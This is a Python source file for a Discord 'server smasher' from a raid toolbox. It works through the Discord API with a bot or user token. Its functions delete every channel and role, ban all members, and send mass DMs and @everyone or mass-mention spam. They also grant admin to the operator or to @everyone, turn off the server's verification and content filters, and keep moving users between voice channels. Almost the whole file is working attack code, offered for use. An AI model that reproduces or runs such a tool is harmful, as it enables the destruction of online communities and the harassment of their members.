# Raid ToolBox Server Smasher
# Author: DeadBread76 - https://github.com/DeadBread76/
# Base code (Server Destroyer): Synchronocy - https://github.com/synchronocy
# ThreadPool: Synchronocy - https://github.com/synchronocy

try:
    import os
    import sys
    import json
    import time
    import random
    import ctypes
    import asyncio
    import discord
    import requests
    import pyperclip
    from smconfig import *
    from tkinter import *
    from tkinter.filedialog import *
    from colorama import init
    from termcolor import colored
    from discord import Permissions
    from threading import Thread
    from queue import Queue
    from concurrent.futures import ThreadPoolExecutor
except Exception as e:
    print ("Module import error: " + str(e))
    input()
    sys.exit()

smversion = sys.argv[1]
menucolour = sys.argv[2]
Tk().withdraw()

if sys.platform.startswith('win32'):
    ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Server Smasher v{}".format(smversion))
elif sys.platform.startswith('linux'):
    sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Server Smasher v{}\x07".format(smversion))

class Worker(Thread):
    """
    Pooling
    """

    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as ex:
                pass
            finally:
                self.tasks.task_done()

class ThreadPool:
    """
    Pooling
    """

    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        """
        Add a task to be completed by the thread pool
        """
        self.tasks.put((func, args, kargs))

    def map(self, func, args_list):
        """
        Map an array to the thread pool
        """
        for args in args_list:
            self.add_task(func, args)

    def wait_completion(self):
        """
        Await completions
        """
        self.tasks.join()

pool = ThreadPool(int(threadcount))
loop = asyncio.get_event_loop()
channellist = []
client = discord.Client()

if sys.platform.startswith('win32'):
    clear = lambda: os.system('cls')
    os.system('mode con:cols=70 lines=35')
elif sys.platform.startswith('linux'):
    clear = lambda: os.system('clear')
init()

if usemultiple == True:
    useable = []
    useabletokens = []
    clear()
    if sys.platform.startswith('win32'):
        with open (".\\spammer\\smtokens.txt", "r") as handle:
            tokens = handle.readlines()
    elif sys.platform.startswith('linux'):
        with open ("spammer/smtokens.txt", "r") as handle:
            tokens = handle.readlines()
    print ("Getting token info...")
    for token in tokens:
        apilink = 'https://discordapp.com/api/v6/users/@me'
        headers = {'Authorization': "Bot " + token.rstrip(), 'Content-Type': 'application/json'}
        src = requests.get(apilink, headers=headers)
        if "401: Unauthorized" in str(src.content):
            pass
        else:
            response = json.loads(src.content.decode())
            useable.append(response['username']+"#"+response['discriminator']+" (ID: "+str(response['id'])+") ")
            useabletokens.append(token.rstrip())
    clear()
    count = -1
    print (colored("Select the Bot to use.\n-------------------------\n",menucolour))
    for bot in useable:
        count += 1
        print(colored(str(count)+". "+bot,menucolour))
    print (colored("\n-------------------------",menucolour))
    botsel = input("\nBot of choice: ")
    token = useabletokens[int(botsel)]

#Attacks
def deletechannel(channel):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    src = requests.delete("https://discordapp.com/api/v6/channels/"+channel, headers=headers)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        deletechannel(channel)

def removeban(server,user):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    src = requests.delete("https://discordapp.com/api/v6/guilds/"+str(server)+"/bans/"+str(user), headers=headers)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        removeban(server,user)

def deleterole(role,server):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    src = requests.delete("https://discordapp.com/api/v6/guilds/"+str(server)+"/roles/"+str(role), headers=headers)
    if "You are being rate limited." in str(src.content):
        time.sleep(3)
        deleterole(role,server)

def createrole(name,server):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    payload = {'hoist': 'true', 'name': name, 'mentionable': 'true', 'color': random.randint(1000000,9999999), 'permissions': random.randint(1,10)}
    src = requests.post('https://ptb.discordapp.com/api/v6/guilds/'+str(server)+'/roles', headers=headers, json=payload)
    if "You are being rate limited." in str(src.content):
        time.sleep(3)
        createrole(name,server)

def senddmtouser(user,content,usetts):
    dmlist = []
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}

    payload = {
        'recipient_id': user
    }
    src = requests.post('https://discordapp.com/api/v6/users/@me/channels', headers=headers, json=payload)
    userdm = src.content.decode()
    jsonstring = json.loads(userdm).values()
    for x in jsonstring:
        dmlist.append(x) #boat floating
    userdm = dmlist[2]
    payload = {"content" : content,"tts" : usetts,"mention_everyone" : "true"}
    src = requests.post("https://discordapp.com/api/v6/channels/"+userdm+"/messages", headers=headers, json=payload)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        senddmtouser(user,content)

def banuser(user,server):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    src = requests.put("https://discordapp.com/api/v6/guilds/"+str(server)+"/bans/"+str(user)+"?delete-message-days=1&reason="+str(banreason), headers=headers)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        banuser(user,server)

def createchannel(server,channelname,channeltype):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    payload = {'name': channelname,'type': channeltype}
    src = requests.post("https://discordapp.com/api/v6/guilds/"+str(server)+"/channels", headers=headers,json=payload)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        createchannel(server,channelname,channeltype)

def sendspam(channel,msgcontent,usetts):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    payload = {"content" : msgcontent,"tts" : usetts,"mention_everyone" : "true"}
    src = requests.post("https://discordapp.com/api/v6/channels/"+channel+"/messages", headers=headers, json=payload)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        sendspam(channel,msgcontent,usetts)

def mover(server,user,channel):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token,'Content-Type': 'application/json'}
    else:
        headers={ 'Authorization': token,'Content-Type': 'application/json'}
    payload = {'channel_id': str(channel)}
    src = requests.patch("https://discordapp.com/api/v6/guilds/"+str(server)+"/members/"+str(user), headers=headers,json=payload)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        mover(server,user,channel)

def massnick(server,user,nick):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token,'Content-Type': 'application/json'}
    else:
        headers={ 'Authorization': token,'Content-Type': 'application/json'}
    payload = {'nick': str(nick)}
    src = requests.patch("https://discordapp.com/api/v6/guilds/"+str(server)+"/members/"+str(user), headers=headers,json=payload)
    if "You are being rate limited." in str(src.content):
        time.sleep(5)
        massnick(server,user,nick)

print ("Starting...")

def inputselection(text):
    output = input(text)
    return output

def complete_pool():
    pool.wait_completion()
    return None

@client.event
async def on_ready():
    if changegameonlogin == True:
        await client.change_presence(activity=discord.Game(name=logingame))
    clear()
    print (colored("Login success!","green"))
    await serverselect()

async def serverselect():
    if sys.platform.startswith('win32'):
        os.system('mode con:cols=70 lines=35')
    serverlist = []
    clear()
    if clienttype == "bot":
        usert = "Bot"
    else:
        usert = "User"
    print (colored("Logged in as {}".format(client.user.name+"#"+client.user.discriminator,menucolour)))
    print (colored("{} is in the following channels: \n".format(usert),menucolour))
    counter = 0
    serverlist.append("0")
    for serv in client.guilds:
        membcount = len(serv.members)
        counter += 1
        print(colored(str(counter)+'. ('+str(serv.id)+') '+str(serv)+" ({} members)".format(membcount),menucolour))
        serverlist.append(serv.id)
    print('\n----------------------------------------')
    servernum = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Select the server to configure bot actions: ')
    try:
        if int(servernum) == 0:
            await serverselect()
        SERVER = serverlist[int(servernum)]
    except Exception:
        await serverselect()
    await main(SERVER)

async def main(SERVER):
    if sys.platform.startswith('win32'):
        os.system('mode con:cols=70 lines=35')
    clear()
    server = client.get_guild(int(SERVER))
    print ("Server: " + colored(server.name,menucolour))
    print ("Server ID: " + colored(str(SERVER),menucolour))
    membercount = len(server.members)
    tchancount = len(server.text_channels)
    vchancount = len(server.voice_channels)
    rolecount = len(server.roles)
    print (colored("{} Members".format(membercount),menucolour))
    print (colored("{} Roles".format(rolecount),menucolour))
    print (colored("{} Text Channels, {} Voice Channels".format(tchancount,vchancount),menucolour))
    print ("----------------------------------------")
    print ("Options:")
    print (colored(" 1. Configure then destroy. \n 2. Chaos options \n 3. Create Server Invite. \n 4. Change What the bot is playing. \n 5. Leave server. \n 6. Return to Server Select",menucolour))
    opts = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Select the number for your option: ")
    toggleopts = {
        'namechange': namechange,
        'servname': servname,
        'iconbegone': iconbegone,
        'changeicon': changeicon,
        'iconfile': iconfile,
        'rembans': rembans,
        'chandel': chandel,
        'roledel': roledel,
        'userban': userban,
        'banreason': banreason,
        'userid': userid,
        'senddm': senddm,
        'dmcontent': dmcontent,
        'createchan': createchan,
        'chanmethod': chanmethod,
        'channame': channame,
        'channelno': channelno,
        'usespam': usespam,
        'spammethod': spammethod,
        'usetts': usetts,
        'customtxt': customtxt,
        'gimmieadmin': gimmieadmin,
        'me': me,
        'giveeveryoneadmin': giveeveryoneadmin,
        'createroles': createroles,
        'crolecount': crolecount,
        'rolesname': rolesname,
        'custrolename': custrolename
        }
    try:
        if int(opts) == 1:
            async def changesettings(toggleopts,SERVER):
                if sys.platform.startswith('win32'):
                    os.system('mode con:cols=70 lines=35')
                try:
                    clear()
                    server = client.get_guild(int(SERVER))
                    print (colored("Type 'start' to start.",menucolour))
                    print (colored("0.  Go back",menucolour))
                    print (colored("1.  Change server name: {}".format(toggleopts['namechange']),menucolour))
                    print (colored("2.  New Server Name: {}".format(toggleopts['servname']),menucolour))
                    print (colored("3.  Remove server icon: {}".format(toggleopts['iconbegone']),menucolour))
                    print (colored("4.  Change server icon: {}".format(toggleopts['changeicon']),menucolour))
                    print (colored("5.  Icon Filename: {}".format(toggleopts['iconfile']),menucolour))
                    print (colored("6.  Remove Bans: {}".format(toggleopts['rembans']),menucolour))
                    print (colored("7.  Delete all channels: {}".format(toggleopts['chandel']),menucolour))
                    print (colored("8.  Delete all roles: {}".format(toggleopts['roledel']),menucolour))
                    print (colored("9.  Ban all members: {}".format(toggleopts['userban']),menucolour))
                    print (colored("10. Ban Reason: {}".format(toggleopts['banreason']),menucolour))
                    print (colored("11. Users to not Ban: {}".format(toggleopts['userid']),menucolour))
                    print (colored("12. Send DM to everyone: {}".format(toggleopts['senddm']),menucolour))
                    print (colored("13. DM Content: {}".format(toggleopts['dmcontent']),menucolour))
                    print (colored("14. Create Channels: {}".format(toggleopts['createchan']),menucolour))
                    print (colored("15. Channel Creation type: {}".format(toggleopts['chanmethod']),menucolour))
                    print (colored("16. Name for the created channels: {}".format(toggleopts['channame']),menucolour))
                    print (colored("17. Number of channels to create: {}".format(toggleopts['channelno']),menucolour))
                    print (colored("18. Spam after destruction: {}".format(toggleopts['usespam']),menucolour))
                    print (colored("19. Spamming method: {}".format(toggleopts['spammethod']),menucolour))
                    print (colored("20. Text to spam: {}".format(toggleopts['customtxt']),menucolour))
                    print (colored("21. Use text to speech in message: {}".format(toggleopts['usetts']),menucolour))
                    print (colored("22. Give yourself admin: {}".format(toggleopts['gimmieadmin']),menucolour))
                    print (colored("23. Your ID: {}".format(toggleopts['me']),menucolour))
                    print (colored("24. Give @everyone admin: {}".format(toggleopts['giveeveryoneadmin']),menucolour))
                    print (colored("25. Create Roles: {}".format(toggleopts['createroles']),menucolour))
                    print (colored("26. Number of roles to create: {}".format(toggleopts['crolecount']),menucolour))
                    print (colored("27. Role Creation type: {}".format(toggleopts['rolesname']),menucolour))
                    print (colored("28. Name of roles: {}".format(toggleopts['custrolename']),menucolour))
                    toga = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Item to toggle or change:\n")
                    if toga.lower() == "start":
                        for channel in server.channels:
                            myperms = channel.permissions_for(server.get_member(client.user.id))
                            if myperms.administrator:
                                pass
                            else:
                                print (colored("You do not have the permissions to destroy this server.","red"))
                                con = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Continue anyway?(Y/N)")
                                if con.lower() == 'y':
                                    break
                                else:
                                    await main(SERVER)

                        if toggleopts['chandel'] == True:
                            print('Deleting channels.')
                            for channel in server.channels:
                                print (colored("Deleting " + str(channel.name),"blue"))
                                pool.add_task(deletechannel,str(channel.id))
                            await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
                            print('Finished deleting channels.')

                        if toggleopts['roledel'] == True:
                           print ('Deleting Roles.')
                           for role in server.roles:
                                print (colored("Deleting role: " + role.name,"blue"))
                                pool.add_task(deleterole,str(role.id),SERVER)
                           pool.wait_completion()
                           print('Finished deleting roles.')

                        if toggleopts['rembans'] == True:
                            print ("Removing bans.")
                            bans = await server.bans()
                            for ban in bans:
                                for user in ban:
                                    pool.add_task(removeban,str(server.id),str(user.id))

                        if toggleopts['senddm'] == True:
                            for user in server.members:
                                print (colored('Sending DM to ' + user.name,"blue"))
                                pool.add_task(senddmtouser,user.id,toggleopts['dmcontent'],toggleopts['usetts'])
                            await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)

                        if toggleopts['namechange'] == True:
                            print('Changing server name...')
                            await server.edit(name=str(toggleopts['servname']))

                        if toggleopts['iconbegone'] == True:
                            print('Removing icon...')
                            await client.edit_server(server=server, icon=None)

                        if toggleopts['changeicon'] == True:
                            print('Changing icon...')
                            with open(toggleopts['iconfile'], 'rb') as handle:
                                icon = handle.read()
                                await server.edit(icon=icon)

                        if toggleopts['giveeveryoneadmin'] == True:
                            print('Giving everyone admin...')
                            for role in server.roles:
                                if role.name == '@everyone':
                                    await role.edit(permissions=Permissions.all())
                                    break

                        if toggleopts['userban'] == True:
                            print('Banning users...')
                            for user in server.members:
                                if str(user.name+"#"+user.discriminator) in toggleopts['userid']:
                                    print (colored("Not Banning " + str(user.name),"green"))
                                else:
                                    print (colored('Banning ' + str(user.name),"blue"))
                                    pool.add_task(banuser,str(user.id),SERVER)
                            await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)

                        if toggleopts['gimmieadmin'] == True:
                            print('Giving you admin...')
                            role = await server.create_role(name="Admin", permissions=Permissions.all())
                            user = server.get_member(int(toggleopts['me']))
                            await user.add_roles(role)

                        if toggleopts['createchan'] == True:
                            print('Creating channels.')
                            for x in range(int(toggleopts['channelno'])):
                                if toggleopts['chanmethod'].lower() == "ascii":
                                    asc = ""
                                    for x in range(60):
                                        num = random.randrange(13000)
                                        asc = asc + chr(num)
                                    pool.add_task(createchannel,SERVER,asc,"text")
                                if toggleopts['chanmethod'].lower() == "set":
                                    pool.add_task(createchannel,SERVER,toggleopts['channame'],"text")

                                if toggleopts['chanmethod'].lower() == "voice":
                                    pool.add_task(createchannel,SERVER,toggleopts['channame'],"voice")
                            await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
                            print ('Channels Created.')

                        if toggleopts['createroles'] == True:
                            print('Creating roles.')
                            for x in range(int(toggleopts['crolecount'])):
                                if toggleopts['rolesname'] == "set":
                                    pool.add_task(createrole,toggleopts['custrolename'],server.id)

                                if toggleopts['rolesname'] == "ascii":
                                    asc = ""
                                    for x in range(60):
                                        num = random.randrange(13000)
                                        asc = asc + chr(num)
                                    pool.add_task(createrole,asc,server.id)
                            await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)

                        if toggleopts['chanmethod'].lower() == "voice":
                            if toggleopts['chandel'] == True:
                                print (colored("Not spamming, due to there only being voice channels in this server.","red"))
                                await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"")
                                await main(SERVER)

                        if toggleopts['usespam'] == True:
                            print('Spam will start in 5 seconds.')
                            if toggleopts['spammethod'] == "asc":
                                await ascii_spam(SERVER,toggleopts['usetts'])
                            if toggleopts['spammethod'] == "massment":
                                await mass_tag(SERVER,toggleopts['usetts'])
                            if toggleopts['spammethod'] == "text":
                                await text_spam(SERVER,toggleopts['customtxt'],toggleopts['usetts'])
                            if toggleopts['spammethod'] == "everyone":
                                await everyonespam(SERVER,toggleopts['usetts'])
                        else:
                            print ("Finished!")
                            await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"")
                            await main(SERVER)

                    if int(toga) == 0:
                        await main(SERVER)
                    elif int(toga) == 1:
                        if toggleopts['namechange'] == True:
                            toggleopts['namechange'] = False
                        else:
                            toggleopts['namechange'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 2:
                        toggleopts['servname'] = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'New Server name: ')
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 3:
                        if toggleopts['iconbegone'] == True:
                            toggleopts['iconbegone'] = False
                        else:
                            toggleopts['iconbegone'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 4:
                        if toggleopts['changeicon'] == True:
                            toggleopts['changeicon'] = False
                        else:
                            toggleopts['changeicon'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 5:
                        toggleopts['iconfile'] = askopenfilename(initialdir = os.getcwd(),title = "Select server icon")
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 6:
                        if toggleopts['rembans'] == True:
                            toggleopts['rembans'] = False
                        else:
                            toggleopts['rembans'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 7:
                        if toggleopts['chandel'] == True:
                            toggleopts['chandel'] = False
                        else:
                            toggleopts['chandel'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 8:
                        if toggleopts['roledel'] == True:
                            toggleopts['roledel'] = False
                        else:
                            toggleopts['roledel'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 9:
                        if toggleopts['userban'] == True:
                            toggleopts['userban'] = False
                        else:
                            toggleopts['userban'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 10:
                        toggleopts['banreason'] = input ("Ban Reason: ")
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 11:
                        appen = input ("Username and Descriminator: ")
                        if appen == '':
                            await changesettings(toggleopts,SERVER)
                        else:
                            toggleopts['userid'].append(appen)
                            await changesettings(toggleopts,SERVER)
                    elif int(toga) == 12:
                        if toggleopts['senddm'] == True:
                            toggleopts['senddm'] = False
                        else:
                            toggleopts['senddm'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 13:
                        toggleopts['dmcontent']  = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'DM Content: ')
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 14:
                        if toggleopts['createchan'] == True:
                            toggleopts['createchan'] = False
                        else:
                            toggleopts['createchan'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 15:
                        if toggleopts['chanmethod'] == "set":
                            toggleopts['chanmethod'] = "ascii"
                        elif toggleopts['chanmethod'] == "ascii":
                            toggleopts['chanmethod'] = "voice"
                        elif toggleopts['chanmethod'] == "voice":
                            toggleopts['chanmethod'] = "set"
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 16:
                        toggleopts['channame']  = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Name of created channels: ')
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 17:
                        toggleopts['channelno'] = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Number of Channels to create: ')
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 18:
                        if toggleopts['usespam'] == True:
                            toggleopts['usespam'] = False
                        else:
                            toggleopts['usespam'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 19:
                        if toggleopts['spammethod'] == "text":
                            toggleopts['spammethod'] = "asc"
                        elif toggleopts['spammethod'] == "asc":
                            toggleopts['spammethod'] = "everyone"
                        elif toggleopts['spammethod'] == "everyone":
                            toggleopts['spammethod'] = "massment"
                        elif toggleopts['spammethod'] == "massment":
                            toggleopts['spammethod'] = "text"
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 20:
                        toggleopts['customtxt'] = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Text to spam: ')
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 21:
                        if toggleopts['usetts'] == 'true':
                            toggleopts['usetts'] = 'false'
                        else:
                            toggleopts['usetts'] = 'true'
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 22:
                        if toggleopts['gimmieadmin'] == True:
                            toggleopts['gimmieadmin'] = False
                        else:
                            toggleopts['gimmieadmin'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 23:
                        toggleopts['me']  = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Your ID for giving admin: ')
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 24:
                        if toggleopts['giveeveryoneadmin'] == True:
                            toggleopts['giveeveryoneadmin'] = False
                        else:
                            toggleopts['giveeveryoneadmin'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 25:
                        if toggleopts['createroles'] == True:
                            toggleopts['createroles'] = False
                        else:
                            toggleopts['createroles'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 26:
                        toggleopts['crolecount'] = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Number of Roles to create: ')
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 27:
                        if toggleopts['rolesname'] == 'set':
                            toggleopts['rolesname'] = 'ascii'
                        else:
                            toggleopts['rolesname'] = 'set'
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 28:
                        toggleopts['custrolename'] = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Name of created roles: ')
                        await changesettings(toggleopts,SERVER)
                    else:
                        print ("Invalid option")
                        await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
                        await changesettings(toggleopts,SERVER)
                except Exception as e:
                    print (e)
                    await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
                    await changesettings(toggleopts,SERVER)
            await changesettings(toggleopts,SERVER)

        elif int(opts) == 2:
            clear()
            print(colored("Chaos options",menucolour))
            print(colored("0.  Back",menucolour))
            print(colored("1.  Move People in VC",menucolour))
            print(colored("2.  Mass Nickname Change",menucolour))
            print(colored("3.  Make server Raidable and insecure",menucolour))
            sel = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Selection: ')
            if int(sel) == 0:
                await main(SERVER)
            elif int(sel) == 1:
                clear()
                print("Moving members in voice channels.")
                while not client.is_closed():
                    channellist = []
                    memberlist = []
                    for channel in server.voice_channels:
                        channellist.append(channel)
                    for channel in channellist:
                        for member in channel.members:
                            memberlist.append(member)
                    for member in memberlist:
                        try:
                            channel = random.choice(channellist)
                            channel = channel
                            pool.add_task(mover,server.id,member.id,channel.id)
                            await asyncio.sleep(0.1)
                        except Exception:
                            pass
                    await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
            elif int(sel) == 2:
                clear()
                newnick = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'New Nickname: ')
                print(colored("Changing Nicknames, Please wait...",menucolour))
                for member in server.members:
                    pool.add_task(massnick,server.id,member.id,newnick)
                await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
                print(colored("Finished Changing nicknames.",menucolour))
                await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Press Enter to return to menu.\n')
                await main(SERVER)
            elif int(sel) == 3:
                clear()
                print(colored("Modifying server rules, Please wait...",menucolour))
                if clienttype == 'bot':
                    headers={ 'Authorization': 'Bot '+token,'Content-Type': 'application/json'}
                else:
                    headers={ 'Authorization': token,'Content-Type': 'application/json'}
                payload = {'default_message_notifications': 0,'explicit_content_filter': 0,'verification_level': 0}
                requests.patch('https://discordapp.com/api/v6/guilds/'+str(server.id),headers=headers,json=payload)
                (colored("Rules modified.",menucolour))
                await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Press Enter to return to menu.\n')
                await main(SERVER)
            else:
                await main(SERVER)
        elif int(opts) == 3:
            for channel in server.text_channels:
                invitelink = await channel.create_invite()
                invite = invitelink.url
                pyperclip.copy(invite)
                print (invite + " copied to clipboard.")
                await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
                await main(SERVER)
            for channel in server.voice_channels:
                invitelink = await channel.create_invite()
                invite = invitelink.url
                pyperclip.copy(invite)
                print (invite + " copied to clipboard.")
                await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
                await main(SERVER)
            print ("Unable to create invite.")
            await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
            await main(SERVER)

        elif int(opts) == 4:
            play = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Playing ')
            await client.change_presence(activity=discord.Game(name=play))
            await main(SERVER)

        elif int(opts) == 5:
            print ("Are you sure you want to leave this server? (Y/N): ")
            yn = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
            if yn.lower() == 'y':
                await server.leave()
                await asyncio.sleep(3)
                await serverselect()
            else:
                await main(SERVER)

        elif int(opts) == 6:
            await serverselect()
    except Exception as e:
        print (colored("Error:","red"))
        print (colored(e,"red"))
        await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
        await main(SERVER)

async def mass_tag(SERVER,usetts):
    await asyncio.sleep(5)
    server = client.get_guild(int(SERVER))
    msg = ''
    for member in server.members:
        msg += member.mention + ' '
    while not client.is_closed():
        for channel in server.text_channels:
            myperms = channel.permissions_for(server.get_member(client.user.id))
            if not myperms.send_messages:
                continue
            print('Mass Mentioning in: '+channel.name)
            for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                pool.add_task(sendspam,str(channel.id),m,usetts)

async def ascii_spam(SERVER,usetts): # "oh god you scrambled that server"
    await asyncio.sleep(5)
    server = client.get_guild(int(SERVER))
    await client.wait_until_ready()
    while not client.is_closed():
        for channel in server.text_channels:
            myperms = channel.permissions_for(server.get_member(client.user.id))
            if not myperms.send_messages:
                continue
            print('Ascii Spamming in: '+channel.name)
            asc = ""
            for x in range(1999):
                num = random.randrange(13000)
                asc = asc + chr(num)
            pool.add_task(sendspam,str(channelid),asc,usetts)

async def text_spam(SERVER,customtxt,usetts):
    await asyncio.sleep(5)
    server = client.get_guild(int(SERVER))
    await client.wait_until_ready()
    while not client.is_closed():
        for channel in server.text_channels:
            myperms = channel.permissions_for(server.get_member(client.user.id))
            if not myperms.send_messages:
                continue
            print('Text Spamming in: '+channel.name)
            pool.add_task(sendspam,str(channel.id),customtxt,usetts)


async def everyonespam(SERVER,usetts):
    await asyncio.sleep(5)
    server = client.get_guild(int(SERVER))
    await client.wait_until_ready()
    while not client.is_closed():
        for channel in server.text_channels:
            myperms = channel.permissions_for(server.get_member(client.user.id))
            if not myperms.send_messages:
                continue
            message = "@everyone"
            print('@everyone Spamming in: '+channel.name)
            pool.add_task(sendspam,str(channel.id),message,usetts)

if clienttype.lower() == "user":
    try:
        client.run(token, bot=False)
    except Exception as c:
        print (str(c))
if clienttype.lower() == "bot":
    try:
        client.run(token)
    except Exception as c:
        print (str(c))
        input()
